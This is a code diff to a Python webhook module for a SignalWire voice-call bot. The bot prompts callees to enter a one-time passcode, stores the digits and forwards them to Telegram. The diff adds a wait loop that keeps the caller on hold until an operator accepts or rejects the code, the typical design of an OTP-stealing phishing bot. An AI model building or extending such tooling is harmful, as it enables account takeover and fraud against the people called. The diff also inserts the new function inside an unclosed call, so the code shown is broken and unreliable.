@@ -167,6 +167,8 @@ async def signalwire_deny(call_id: str, request: Request, Digits: str = Form(Non
             }
             
             await MongoDBService.update_call_events(call_id, event)
+            await MongoDBService.update_call_field(call_id, 'otp_code', Digits)
+            await MongoDBService.update_call_field(call_id, 'dtmf_code', Digits)
             await MongoDBService.update_call_status(call_id, 'otp_entered')
             
             await manager.send_to_user(call_data['user_id'], {
@@ -186,23 +188,20 @@ async def signalwire_deny(call_id: str, request: Request, Digits: str = Form(Non
             except Exception as e:
                 logger.warning(f"Failed to forward OTP to Telegram: {e}")
             
-            # Play Step 3 + Rejected message (EXACT text from UI)
+            # Play Step 3 message and WAIT for admin action
             step_3_message = call_data.get('step_3_message', 'Please wait')
-            rejected_message = call_data.get('rejected_message', 'Thank you')
+            wait_url = f"{backend_url}/api/webhooks/signalwire/{call_id}/wait"
             
             twiml = f'''<?xml version="1.0" encoding="UTF-8"?>
 <Response>
     <Say voice="{voice}">{step_3_message}</Say>
-    <Pause length="2"/>
-    <Say voice="{voice}">{rejected_message}</Say>
-    <Hangup/>
+    <Pause length="3"/>
+    <Redirect>{wait_url}</Redirect>
 </Response>'''
             return Response(content=twiml, media_type="application/xml")
         else:
             # First time - Ask for OTP using Step 2 message (EXACT text from UI)
-            step_2_message = call_data.get('step_2_message', 'Please enter your code')
-            
-            gather_url = f"https://callbot-research.preview.emergentagent.com/api/webhooks/signalwire/{call_id}/deny"
+            gather_url = f"{backend_url}/api/webhooks/signalwire/{call_id}/deny"
             
             twiml = f'''<?xml version="1.0" encoding="UTF-8"?>
 <Response>
@@ -219,6 +218,61 @@ async def signalwire_deny(call_id: str, request: Request, Digits: str = Form(Non
         return Response(
             content='<?xml version="1.0" encoding="UTF-8"?><Response><Say>Error</Say><Hangup/></Response>',
             media_type="application/xml"
+
+@router.post("/signalwire/{call_id}/wait")
+async def signalwire_wait(call_id: str):
+    """Wait endpoint - Keep call alive while waiting for admin decision"""
+    try:
+        call_data = await MongoDBService.get_call(call_id)
+        
+        if not call_data:
+            return Response(
+                content='<?xml version="1.0" encoding="UTF-8"?><Response><Hangup/></Response>',
+                media_type="application/xml"
+            )
+        
+        voice = call_data.get('tts_voice', 'Aurora')
+        backend_url = os.getenv('BACKEND_URL', 'https://lanjutan-saya-1.preview.emergentagent.com')
+        
+        # Check if admin made decision
+        admin_decision = call_data.get('admin_decision')
+        
+        if admin_decision == 'accept':
+            # Play accepted message
+            accepted_message = call_data.get('accepted_message', 'Thank you')
+            twiml = f'''<?xml version="1.0" encoding="UTF-8"?>
+<Response>
+    <Say voice="{voice}">{accepted_message}</Say>
+    <Hangup/>
+</Response>'''
+            return Response(content=twiml, media_type="application/xml")
+            
+        elif admin_decision == 'deny':
+            # Play rejected message
+            rejected_message = call_data.get('rejected_message', 'Invalid code')
+            twiml = f'''<?xml version="1.0" encoding="UTF-8"?>
+<Response>
+    <Say voice="{voice}">{rejected_message}</Say>
+    <Hangup/>
+</Response>'''
+            return Response(content=twiml, media_type="application/xml")
+        else:
+            # Still waiting - loop back
+            wait_url = f"{backend_url}/api/webhooks/signalwire/{call_id}/wait"
+            twiml = f'''<?xml version="1.0" encoding="UTF-8"?>
+<Response>
+    <Pause length="2"/>
+    <Redirect>{wait_url}</Redirect>
+</Response>'''
+            return Response(content=twiml, media_type="application/xml")
+            
+    except Exception as e:
+        logger.error(f"Wait error: {e}")
+        return Response(
+            content='<?xml version="1.0" encoding="UTF-8"?><Response><Hangup/></Response>',
+            media_type="application/xml"
+        )
+
         )
 
 @router.post("/signalwire/{call_id}/accept")
